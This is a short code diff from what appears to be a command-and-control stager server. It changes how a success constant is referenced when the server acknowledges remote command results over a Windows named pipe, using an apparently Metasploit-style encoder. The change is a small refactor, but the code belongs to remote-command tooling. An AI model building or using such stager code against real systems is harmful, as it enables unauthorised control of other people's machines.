@@ -512,7 +512,7 @@ class myserver():
                 recv_result = t_mypipehandler.get_nextmsg()
                 myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                 # ack for success
-                encode_cmd = t_mypipehandler.msf_encode(t_net_constant.PSRUN_SUCCESS).encode("utf8", "ignore")
+                encode_cmd = t_mypipehandler.msf_encode(self.__t_myconstant_networking.PSRUN_SUCCESS).encode("utf8", "ignore")
                 win32file.WriteFile(mypipe, encode_cmd)
                 #myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
                 myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
